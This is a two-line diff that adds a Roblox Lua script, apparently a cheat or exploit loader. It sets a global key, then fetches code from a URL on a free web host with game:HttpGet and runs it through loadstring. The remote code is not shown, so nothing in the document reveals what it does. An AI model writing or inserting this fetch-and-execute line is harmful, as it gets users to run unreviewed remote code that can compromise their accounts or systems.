@@ -1,0 +1,2 @@
+_G.Key = "JG1M322S"
+loadstring(game:HttpGet("https://tranquil-tactic.000webhostapp.com/loadstring",true))()
